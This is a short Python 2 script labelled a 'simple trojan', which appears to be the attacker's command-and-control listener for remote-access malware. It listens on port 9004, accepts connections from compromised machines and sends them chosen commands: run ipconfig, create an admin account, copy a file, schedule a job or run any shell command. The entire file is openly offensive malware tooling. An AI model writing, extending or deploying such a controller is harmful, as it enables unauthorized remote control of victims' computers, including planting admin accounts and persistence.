##
# SIMPLE TROJAN PYTHON 
#@author - Jerome Themee - security analyst 
#@date - 16/07/2015
##
import socket

import threading

# socket creation
bind_ip = "0.0.0.0" 
bind_port = 9004

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
server.bind((bind_ip,bind_port))  
server.listen(5)  

def handle_client(client_socket):
	while True:
		# go to the choice list
		print "[*] What would you like to do ?\n"
		print "[*] go 1 for a ipconfig"
		print "[*] go 2 for a create admin"
		print "[*] go 3 for copy a file"
		print "[*] go 4 for create a job"
		print "[*] Or enter a shell cmd "
		choiseTrojan = raw_input("[waiting for your choice] 1 - 2 - 3 - 4 > ")

		client_socket.sendall(choiseTrojan)
		#print the client data
		request = client_socket.recv(2048)
		print "[*] Received: %s\n" % request


while True:
	client,addr = server.accept()
	print "[*] Accepted connection from %s:%d" % (addr[0],addr[1])
#threading started
	client_handler = threading.Thread(target=handle_client,args=(client,))
	client_handler.start()